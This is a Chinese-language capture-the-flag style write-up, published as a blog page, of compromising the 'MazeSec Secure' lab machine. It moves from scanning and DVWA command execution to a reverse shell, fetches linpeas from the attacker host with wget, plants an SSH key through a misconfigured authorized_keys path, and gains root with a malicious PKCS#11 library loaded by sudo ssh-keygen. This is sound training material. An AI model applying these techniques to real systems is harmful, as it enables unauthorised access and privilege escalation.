@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec Secure</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec Secure</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-30 23:46</span>
+    </p>
+    <div class="post-body">
+        <h2>存活主机发现</h2>
+<p>arp-scan 扫描局域网内存活主机：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/secure]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.203   08:00:27:16:0b:23       PCS Systemtechnik GmbH</code></pre>
+<p>目标主机：192.168.6.203</p>
+<h2>TCP端口扫描</h2>
+<p>使用 nmap 进行 TCP 端口扫描：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/secure]
+└─$ nmap -p- -sT 192.168.6.203
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+<p>目标主机开放了 22 和 80 端口。</p>
+<h2>80 端口服务探测</h2>
+<p>访问 80 端口的 HTTP 服务，一个 SSH 介绍页面</p>
+<p><img src="/images/maze-secure/1.png" alt="" /></p>
+<p>dirsearch 扫描目录，部署了一个 DVWA 漏洞靶场，以及file.php 和 phpinfo.php 文件：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/secure]
+└─$ dirsearch -u http://192.168.6.203
+
+Target: http://192.168.6.203/
+
+[14:44:31] Starting: 
+[14:44:45] 302 -    0B  - /dvwa/  -&gt;  login.php
+[14:44:46] 200 -    7B  - /file.php
+[14:44:53] 200 -   23KB - /phpinfo.php
+
+Task Completed</code></pre>
+<p>gobuster 再扫一遍，尽可能多的收集信息：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/mazesec/secure]
+└─$ gobuster dir -u http://192.168.6.203/ \
+ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,log,bak,zip
+
+/index.html           (Status: 200) [Size: 11007]
+/file.php             (Status: 200) [Size: 7]
+/cmd.php              (Status: 200) [Size: 18]
+/phpinfo.php         (Status: 200) [Size: 23479]</code></pre>
+<p>通过扫描目录，发现了 cmd.php 、file.php 、phpinfo.php 以及 DVWA 靶场，在 cmd.php 和 file.php 测试参数没有发现可以利用的可能，现在直接去 DVWA 靶机登录页面，默认用户名密码 admin/password 登录进去。</p>
+<h2>命令执行 Getshell</h2>
+<p>难度设置为 low ，方便直接利用</p>
+<p><img src="/images/maze-secure/2.png" alt="" /></p>
+<p><img src="/images/maze-secure/3.png" alt="" /></p>
+<p>进入命令执行模块，反弹个shell 过来</p>
+<p><img src="/images/maze-secure/4.png" alt="" /></p>
+<p>稳定优化 shell</p>
+<p><img src="/images/maze-secure/5.png" alt="" /></p>
+<pre><code class="language-bash">/usr/bin/script  -qc /bin/bash /dev/null
+按下 ctrl z
+stty raw -echo; fg  
+export TERM=xterm  
+export SHELL=/bin/bash  </code></pre>
+<h2>横向探测</h2>
+<p>现在拿到了 www-data 权限的 shell ，下载 kali 上准备的 linpeas.sh 脚本到 /tmp 目录，扫描是否有提权点</p>
+<pre><code class="language-bash">wget 192.168.6.101/linpeas.sh -O /tmp/linpeas.sh</code></pre>
+<p>linpeas 扫描可能会卡在 cloud 模块，不清楚什么原因，使用 -o 参数跳过 cloud 模块就可以了，另外可以使用 -a 参数进行全面扫描，会尝试使用 su 命令登录其他用户，这个过程会使用空密码、用户名、top 2000 密码进行尝试。</p>
+<p><img src="/images/maze-secure/6.png" alt="" /></p>
+<pre><code class="language-bash">bash linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex -a</code></pre>
+<p>拿到了 lzh 用户的密码 hzl</p>
+<p><img src="/images/maze-secure/7.png" alt="" /></p>
+<h2>SSH 配置变动发现</h2>
+<p>查找近 7 天变化的文件，排除一些系统目录，减少噪音</p>
+<blockquote>
+<p>说明：前一组括号是排除大目录，后一组括号是「最近 7 天内 mtime 或 ctime 变化的文件」，再 -print。</p>
+</blockquote>
+<pre><code class="language-bash">find / \
+  \( -path /run -o -path /sys -o -path /proc -o -path /var/lib -o -path /dev -o -path /usr -o -path /var/log -o -path /var/cache -o -path /boot/grub \) -prune -o \
+  \( -mtime -7 -o -ctime -7 \) -print 2&gt;/dev/null</code></pre>
+<p>检查到 ssh 配置文件存在变动，查看一下</p>
+<p><img src="/images/maze-secure/8.png" alt="" /></p>
+<pre><code class="language-bash">cat /etc/ssh/sshd_config</code></pre>
+<p>关键部分如下：</p>
+<pre><code class="language-plaintext">PermitRootLogin no
+AuthorizedKeysFile      /tmp/authorized_keys2
+StrictModes no</code></pre>
+<p>不允许 root 登录，把公钥配置在了 /tmp/authorized_keys2 文件中，并且关闭了权限检查。</p>
+<p><img src="/images/maze-secure/9.png" alt="" /></p>
+<p><code>AuthorizedKeysFile /tmp/authorized_keys2</code> 是一个全局配置，对所有用户生效；</p>
+<p>因为 PermitRootLogin no，即使有公钥，也不能通过 SSH 登录 root；</p>
+<h2>横向登录 one3</h2>
+<p>在 www-data 用户的 shell 里，在 /tmp 目录下创建 authorized_keys2 文件，写入自己的公钥</p>
+<pre><code class="language-bash">echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqeBIA2vgVTkcqaBMVe7c7PL6S/FP+32ilrc8iUiVYc ssh-ed25519-2025120116260' &gt; /tmp/authorized_keys2</code></pre>
+<p><img src="/images/maze-secure/10.png" alt="" /></p>
+<p>写入以后，kali 用户无法 SSH 连上来，排查发现当前的 /tmp 是 apache 服务的 PrivateTmp 目录，并非系统的 /tmp 目录</p>
+<pre><code class="language-bash">systemctl show apache2 | grep PrivateTmp
+systemctl show ssh | grep PrivateTmp</code></pre>
+<p><img src="/images/maze-secure/11.png" alt="" /></p>
+<p>先尝试上线刚刚扫描出来的 lzh 用户，可以看 /tmp 目录下确实没有 www-data 用户创建的文件如linepeas.sh 和 authorized_keys2</p>
+<p><img src="/images/maze-secure/12.png" alt="" /></p>
+<p>使用 lzh 用户写入公钥，普通用户操作 /tmp 目录是没有问题的</p>
+<pre><code class="language-bash">echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqeBIA2vgVTkcqaBMVe7c7PL6S/FP+32ilrc8iUiVYc ssh-ed25519-2025120116260' &gt; /tmp/authorized_keys2</code></pre>
+<p><img src="/images/maze-secure/13.png" alt="" /></p>
+<h2>SSH 登录 one3 用户</h2>
+<p>Kali 上线 one3 用户，sudo -l 显示 one3 用户可以以 root 身份、无需密码执行 /usr/bin/ssh-keygen</p>
+<p><img src="/images/maze-secure/14.png" alt="" /></p>
+<p>Gtfobins 上查到 ssh-keygen 可以用来提权 <a href="https://gtfobins.github.io/gtfobins/ssh-keygen/">https://gtfobins.github.io/gtfobins/ssh-keygen/</a></p>
+<pre><code class="language-bash">sudo ssh-keygen -D /tmp/lib.so</code></pre>
+<h2>编写恶意 PKCS#11 库</h2>
+<p>ssh-keygen 使用 -D 参数指定一个 PKCS#11 动态库，我们编写一个恶意的 PKCS#11 库，在库加载时执行提权操作，复制一个 SUID bash 到 /tmp 目录下。</p>
+<p>准备 exp.c 文件</p>
+<pre><code class="language-c">// exp.c
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+// PKCS#11 标准函数声明
+typedef struct CK_FUNCTION_LIST CK_FUNCTION_LIST;
+
+// 恶意代码 - 在库加载时执行
+__attribute__((constructor)) void pwn() {
+    if (geteuid() == 0) {  // 如果以root权限运行
+        system("cp /bin/bash /tmp/bash");
+        system("chmod u+s /tmp/bash");
+    }
+}
+
+// 伪装的PKCS#11函数 - 必须存在但可以返回错误
+void C_GetFunctionList(CK_FUNCTION_LIST** ppFunctionList) {
+    // 什么都不做或返回错误，但函数必须存在
+    *ppFunctionList = NULL;
+}</code></pre>
+<p>编译生成动态库 lib.so</p>
+<pre><code class="language-bash">gcc -shared -fPIC -o /tmp/lib.so /tmp/exp.c</code></pre>
+<p><img src="/images/maze-secure/15.png" alt="" /></p>
+<p>运行时，动态库会被 ssh-keygen 加载，执行 pwn 函数，复制 SUID bash 到 /tmp 目录下。</p>
+<h2>ssh-keygen 提权到 root</h2>
+<p>sudo 执行 ssh-keygen，指定编译好的恶意库</p>
+<pre><code class="language-bash">sudo ssh-keygen -D /tmp/lib.so</code></pre>
+<p><img src="/images/maze-secure/16.png" alt="" /></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#linpeas</span>
+                                    <span>#ssh-keygen</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
